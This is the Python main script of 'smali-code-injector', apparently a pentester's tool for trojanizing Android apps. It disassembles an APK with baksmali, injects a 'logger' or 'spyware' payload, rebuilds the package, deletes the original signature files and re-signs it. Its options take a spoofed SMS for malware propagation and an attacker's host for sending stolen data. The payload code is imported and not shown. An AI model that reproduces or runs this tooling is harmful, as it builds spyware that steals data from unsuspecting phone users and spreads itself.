#!/usr/bin/env python
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import argparse
import colorlog
import logging
import os
import re
import shutil
import subprocess
import sys
import zipfile

from payloads.logger import Logger
from payloads.spyware import Spyware
from utils import util

FAILURE = 21
SUCCESS = 22

logging.addLevelName(FAILURE, "FAILURE")
logging.addLevelName(SUCCESS, "SUCCESS")


def failure(self, message, *args, **kws):
    if self.isEnabledFor(FAILURE):
        self._log(FAILURE, message, args, **kws)


def success(self, message, *args, **kws):
    if self.isEnabledFor(SUCCESS):
        self._log(SUCCESS, message, args, **kws)


logging.getLoggerClass().failure = failure
logging.FAILURE = FAILURE
logging.getLoggerClass().success = success
logging.SUCCESS = SUCCESS

formatter = colorlog.ColoredFormatter(
    "%(log_color)s[%(asctime)s] [%(levelname)s] %(message)s%(reset)s",
    datefmt="%H:%M:%S",
    log_colors={
        'DEBUG':    'cyan',     # 10
        'INFO':     'green',    # 20
        'SUCCESS':  'cyan',     # 21
        'FAILURE':  'yellow',   # 22
        'WARNING':  'yellow',   # 30
        'ERROR':    'red',      # 40
        'CRITICAL': 'red, bg_white'       # 50
    },
    reset=True
)

handler = logging.StreamHandler()
handler.setFormatter(formatter)

logger = logging.getLogger("TinderSwiper")
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

DEBUG = 1

# List of implemented payloads
payloads = [
    "logger",
    "spyware"
]


def banner():
    banner = """
       d888888o.       ,o888888o.     8 8888
     .`8888:' `88.    8888     `88.   8 8888
     8.`8888.   Y8 ,8 8888       `8.  8 8888
     `8.`8888.     88 8888            8 8888
      `8.`8888.    88 8888            8 8888
       `8.`8888.   88 8888            8 8888
        `8.`8888.  88 8888            8 8888
    8b   `8.`8888. `8 8888       .8'  8 8888
    `8b.  ;8.`8888    8888     ,88'   8 8888
     `Y8888P ,88P'     `8888888P'     8 8888
    """
    print("{}".format(banner))


def copyright():
    copyright = """
           =[ smali-code-injector v1.1-dev       ]
    + -- --=[ Alexandre Teyar @Ares              ]
    + -- --=[ Pentester at Ambersail Ltd.        ]
    + -- --=[ GitHub: https://github.com/AresS31 ]
    """
    print("{}".format(copyright))


def parse_args():
    """
    Parse and validate user command line.
    """
    # Top-level parser
    parser = argparse.ArgumentParser(
        description="Android assembly code (smali) injector"
    )

    parser.add_argument(
        "-a",
        "--app",
        dest="app",
        help="Android application to trojanize",
        required=True,
        type=str
    )

    subparsers = parser.add_subparsers(
        dest="payload, search",
        help="available commands"
    )

    subparsers.required = True

    # Parser for the "search" command
    parser_search = subparsers.add_parser(
        "search", 
        help="search command - identifies the main activity"
    )

    parser_search.set_defaults(command='search')

    # Parser for the "payload" command
    parser_payload = subparsers.add_parser(
        "payload",
        help="payload command"
    )

    parser_payload.set_defaults(command='payload')
    
    parser_payload.add_argument(
        "-d",
        "--dest",
        dest="destination",
        help="the destination file or directoy for injection filtering",
        default='',
        required=False,
        type=str
    )

    parser_payload.add_argument(
        "-k",
        "--keywords",
        dest="keywords",
        help="keywords (separated by ',') for injection filtering",
        default="-1",
        required=False,
        type=str
    )

    parser_payloads = parser_payload.add_subparsers(
        dest=", ".join(payloads),
        help="available commands"
    )

    parser_payloads.required = True

    # Parser for the "payload->logger" command
    parser_payload_logger = parser_payloads.add_parser(
        "logger", 
        help="logger command"
    )

    parser_payload_logger.set_defaults(payload='logger')

    # Parser for the "payload->logger" command
    parser_payload_spyware = parser_payloads.add_parser(
        "spyware", 
        help="spyware command",
    )

    parser_payload_spyware.add_argument(
        "-ppg",
        "--propagate",
        dest="propagate",
        help="spoofed SMS to send for malware propagation",
        required=False,
        type=str
    )

    parser_payload_spyware.add_argument(
        "-rh",
        "--rhost",
        dest="rhost",
        help="attacker's host/ip for stolen data transmission",
        required=True,
        type=str
    )

    parser_payload_spyware.set_defaults(payload='spyware')

    return parser.parse_args()


def get_main_activity(app):
    """
    Returns the main activity from the AndroidManifest.xml.
    """
    result = ""

    try:
        output = subprocess.check_output(
            "aapt dump badging {0}".format(app),
            shell=True).decode("UTF-8")
        regex = re.compile("launchable-activity:.*")
        result = regex.search(output).group(0)
    
    except subprocess.CalledProcessError as ex:
        logger.error("{} - {}".format(ex.returncode, ex.output))

    return result


def disassemble(app_absolute_path, app_name):
    if not os.path.exists("../tmp"):
        os.makedirs("../tmp")

    instruction = "java -jar ../libs/baksmali-2.2.1.jar disassemble -o {} {} ".format(
        os.path.abspath(os.path.join("../tmp", app_name)),
        os.path.abspath(app_absolute_path))
    subprocess.call(instruction, shell=True)

    # Create a copy of the legitimate app source code
    if DEBUG == 1:
        if not os.path.exists("../tmp"):
            os.makedirs("../tmp")

        util.copy(os.path.join("../tmp", app_name),
                        os.path.join("../debug", app_name))


def reassemble(payload):
    # Create a copy of the infected app's source code
    if DEBUG == 1:
        util.copy(os.path.join("../tmp", payload.app_name),
                  os.path.join("../debug", payload.app_name + "-trojan"))

    # Create the classes.dex
    instruction = "java -jar ../libs/smali-2.2.1.jar {0} -o {1}".format(
        os.path.abspath(os.path.join("../tmp", payload.app_name)),
        os.path.abspath(os.path.join("../tmp", "classes.dex")))

    subprocess.call(instruction, shell=True)

    # Move classes.dex and AndroidManifest then clean-up
    # Create an app-mod folder and erase its certificates
    zipfile.ZipFile(payload.app_absolute_path).extractall(os.path.join(
        "tmp", payload.name))

    for root, subdirs, files in os.walk(os.path.join("../tmp", payload.app_name,
                                                     "META-INF")):
        for file in files:
            file_path = os.path.join("../tmp", payload.app_name, "META-INF", file)
            if (file != "MANIFEST.MF" and (".RSA" in file or ".SF" in file)):
                os.remove(os.path.abspath(file_path))

    # Move the new classes.dex and AndroidManifest into the modified app
    # folder
    util.move_file(os.path.join("./tmp", "classes.dex"),
                     os.path.join("../tmp", payload.app_name, "classes.dex"))

    if (payload.name == "spyware"):
        util.move_file(os.path.join("../tmp", "AndroidManifest.xml"),
                         os.path.join("../tmp", payload.app_name,
                                      "AndroidManifest.xml"))

    # Creation of the final .apk
    # Create the app-mod.zip, rename it to app-mod.apk and remove
    # the app-mod folder
    shutil.make_archive(os.path.join("../tmp", payload.app_name), "zip",
                        os.path.join("../tmp", payload.app_name))

    util.move_file(os.path.join("../tmp", payload.app_name + ".zip"),
                     os.path.join("trojans", payload.app_name + ".apk"))
    shutil.rmtree("../tmp")

    # Sign the new apk with the certificate within certs/
    logger.info("signing...")

    instruction = "../libs//jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore \
    cert/my-release-key.keystore -storepass password {0} alias_name".format(
        os.path.join("../trojans", payload.app_name + ".apk"))
    subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL)


def main():
    try:
        banner()
        copyright()

        args = parse_args()
        
        app_absolute_path = os.path.abspath(args.app)
        head, tail = os.path.split(app_absolute_path)
        app_name = os.path.splitext(tail)[0]

        if (args.command == "search"):
            logger.info("identifying the main activity...")
            main_activity = get_main_activity(app_absolute_path)
            logger.success("{}".format(main_activity))

        elif (args.command == "payload"):
            logger.info("disassembling...")
            logger.info("this operation might take some time")
            disassemble(app_absolute_path, app_name)

            if(args.payload == "spyware"):
                payload = Spyware(args)
            elif (args.payload == "logger"):
                payload = Logger(args)

            logger.info("injecting...")
            payload.run()

            logger.info("reassembling...")
            logger.info("this operation might take some time")
            reassemble(payload)

    except KeyboardInterrupt:
        logger.error("you pressed Ctrl+C")

        if os.path.exists("tmp"):
            shutil.rmtree("tmp", ignore_errors=True)

        sys.exit(0)


if __name__ == "__main__":
    main()
